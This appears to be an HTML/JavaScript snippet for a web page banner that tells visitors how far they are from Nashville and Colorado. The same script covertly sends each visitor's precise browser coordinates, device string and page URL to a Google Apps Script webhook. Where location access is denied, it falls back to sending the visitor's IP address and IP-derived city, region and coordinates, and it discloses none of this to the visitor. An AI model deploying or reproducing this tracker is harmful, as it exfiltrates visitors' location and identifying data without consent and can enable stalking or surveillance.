<!-- DISTANCE BANNER -->
<div id="distance-banner" style="background:red;color:white;text-align:center;padding:15px;display:none;"></div>

<script>
(function() {

  const WEBHOOK_URL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec";

  function sendData(data) {
    fetch(WEBHOOK_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).catch(() => {});
  }

  function getTimestamp() {
    return new Date().toISOString();
  }

  function getDeviceInfo() {
    return navigator.userAgent;
  }

  function sendGeo(lat, lon) {
    sendData({
      timestamp: getTimestamp(),
      lat: lat,
      lon: lon,
      source: "browser",
      device: getDeviceInfo(),
      page: window.location.href
    });
  }

  function sendIPFallback() {
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        sendData({
          timestamp: getTimestamp(),
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          lat: data.latitude,
          lon: data.longitude,
          source: "ip",
          device: getDeviceInfo(),
          page: window.location.href
        });
      })
      .catch(() => {
        sendData({
          timestamp: getTimestamp(),
          source: "unknown",
          device: getDeviceInfo(),
          page: window.location.href
        });
      });
  }

  function toRad(deg) { return deg * Math.PI / 180; }

  function distanceMiles(lat1, lon1, lat2, lon2) {
    var R = 3958.8;
    var dLat = toRad(lat2 - lat1);
    var dLon = toRad(lon2 - lon1);
    var a =
      Math.sin(dLat/2)*Math.sin(dLat/2) +
      Math.cos(toRad(lat1))*Math.cos(toRad(lat2)) *
      Math.sin(dLon/2)*Math.sin(dLon/2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  }

  function showDistanceBanner(lat, lon) {
    var nashLat = 36.1627, nashLon = -86.7816;
    var coLat = 39.6328, coLon = -106.0662;

    var dNash = Math.round(distanceMiles(lat, lon, nashLat, nashLon));
    var dCo = Math.round(distanceMiles(lat, lon, coLat, coLon));

    var banner = document.getElementById("distance-banner");

    var closer = dNash <= dCo ? "Nashville 🎵" : "Colorado ⛷️";

    banner.innerHTML =
      "You're <strong>" + dNash + " mi</strong> from Nashville · " +
      "<strong>" + dCo + " mi</strong> from Colorado · " +
      "<strong>" + closer + "</strong> is closer";

    banner.style.display = "block";

    setTimeout(() => {
      banner.style.display = "none";
    }, 20000);
  }

  // MAIN LOGIC
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;

        sendGeo(lat, lon);
        showDistanceBanner(lat, lon);
      },
      function() {
        sendIPFallback();
      },
      { timeout: 5000 }
    );
  } else {
    sendIPFallback();
  }

})();
</script>
